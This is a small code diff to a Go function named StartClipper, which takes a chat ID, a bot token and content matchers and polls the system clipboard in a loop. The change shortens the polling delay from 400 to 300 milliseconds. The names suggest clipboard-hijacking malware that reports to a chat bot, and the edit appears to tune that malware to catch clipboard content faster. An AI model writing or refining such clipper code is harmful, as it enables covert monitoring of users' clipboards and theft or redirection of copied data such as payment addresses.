@@ -22,7 +22,7 @@ func StartClipper(chat_id string, bot_token string, matchers []Matcher, user str
 		var lastClipboardContent string
 
 		for {
-			time.Sleep(400 * time.Millisecond) // (1000 = 1s)
+			time.Sleep(300 * time.Millisecond) // (1000 = 1s)
 
 			currentContent, err := clipboard.ReadAll()
 			if err != nil {
